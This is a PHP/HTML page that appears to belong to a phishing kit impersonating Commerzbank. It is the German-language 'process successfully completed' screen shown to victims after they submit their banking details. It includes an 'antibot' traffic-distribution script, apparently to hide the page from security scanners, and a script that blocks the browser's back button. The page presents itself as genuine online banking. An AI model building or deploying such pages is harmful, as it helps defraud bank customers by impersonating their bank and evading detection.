<?php
// Start session
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Include antibot protection
include '../antibot/tds.php';
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vorgang abgeschlossen - Commerzbank</title>
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .success {
            text-align: center;
            padding: 50px 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin: 20px 0;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .checkmark {
            color: #28a745;
            font-size: 48px;
            margin: 20px 0;
        }
        .message {
            color: #333;
            font-size: 18px;
            margin: 20px 0;
            line-height: 1.6;
        }
        .info {
            color: #666;
            font-size: 14px;
            margin: 20px 0;
        }
        .button {
            background: #ffcc00;
            color: #333;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 10px;
        }
        .button:hover {
            background: #e6b800;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success">
            <div class="logo">COMMERZBANK</div>
            <div class="checkmark">✅</div>
            <h2>Vorgang erfolgreich abgeschlossen</h2>
            <div class="message">
                <p>Ihre Anfrage wurde erfolgreich verarbeitet.</p>
                <p>Vielen Dank für die Nutzung unseres Digital Banking Services.</p>
            </div>
            <div class="info">
                <p>Sie können diese Seite jetzt schließen oder zur Startseite zurückkehren.</p>
            </div>
            <a href="/" class="button">Zurück zur Startseite</a>
        </div>
    </div>
    
    <script>
        // Prevent back button issues
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function () {
            window.history.pushState(null, null, window.location.href);
        };
    </script>
</body>
</html>
